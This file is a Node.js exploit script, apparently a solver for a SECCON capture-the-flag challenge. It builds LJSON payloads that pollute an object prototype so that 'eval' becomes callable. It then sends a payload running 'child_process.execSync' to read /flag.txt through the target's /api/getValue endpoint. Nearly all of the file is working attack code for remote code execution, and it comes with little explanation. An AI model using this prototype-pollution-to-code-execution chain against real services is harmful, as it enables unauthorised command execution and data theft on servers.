const LJSON = require("ljson");
const fetch = (...args) =>
  import("node-fetch").then(({ default: fetch }) => fetch(...args));

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const SECCON_URL = process.env.SECCON_URL || fail("SECCON_URL not found");

// Inverse of https://github.com/MaiaVictor/LJSON/blob/0c06399baddc08ede6457a59505e188ec0828dab/LJSON.js#L397
const toNumber = (name) => {
  const alphabet = "abcdefghijklmnopqrstuvwxyz";
  let number = 0;
  for (const c of name.split("").reverse()) {
    number *= alphabet.length;
    number += alphabet.indexOf(c);
  }
  return number;
};

const code = 'require("child_process").execSync("cat /flag.txt").toString()';

// A source of Prototype Pollution
const evilSequence0 = LJSON.stringify(($, map, n) =>
  $("set", $("set", map, "__proto__", null), "polluted", toNumber("eval"))
);

// A sink of Prototype Pollution
const evilSequence1 = LJSON.stringify((a, b, c) => a(code)).replace(
  "a(",
  "polluted("
);

const params = new URLSearchParams({
  sequence0: evilSequence0,
  n0: 0,
  sequence1: evilSequence1,
  n1: 0,
});

console.log(params);

const main = async () => {
  const text = await (
    await fetch(`${SECCON_URL}/api/getValue?${params}`)
  ).text();
  console.log(text);
};
main();
